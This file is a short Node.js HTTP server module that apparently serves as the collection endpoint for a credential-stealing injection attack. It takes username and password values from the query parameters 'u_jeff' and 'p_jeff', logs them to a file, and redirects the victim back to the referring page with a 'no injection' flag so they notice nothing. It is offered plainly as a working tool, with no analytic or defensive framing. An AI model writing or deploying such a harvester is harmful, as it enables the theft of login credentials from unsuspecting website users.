
var http = require('http');
var url=require('url');
var fs=require('fs');
var path=require('path');
var qs = require('querystring');


exports.start = function(PORT) {
var server = http.createServer(function (request, response) {
        var arrUrl  = url.parse(request.url);
        // console.log(request.headers.referer);
        var query = arrUrl.query;
        if (query) {
                var arrQ = qs.parse(query);
                if (arrQ.u_jeff && arrQ.p_jeff) {
                        var str_log = arrQ.u_jeff + ":" + arrQ.p_jeff + "\r\n";
                        console.log("we get: ==============\r\n" + str_log);
                        fs.appendFile('./log.txt', str_log, 'utf8', function(err){if (err) {console.log(err)}});
                }
        }
        var loc = request.headers.referer + (request.headers.referer.indexOf("?") >=0 ? "&" : "?") + "jeff_no_zhuru=1"; 
        if (request.headers.referer) {
                response.writeHead(302, {
                        'Location': loc
                });
        } else {
                response.write('ok');
        }
        response.end();
});
server.listen(PORT);
console.log("http Server runing at port: " + PORT + ".");
}
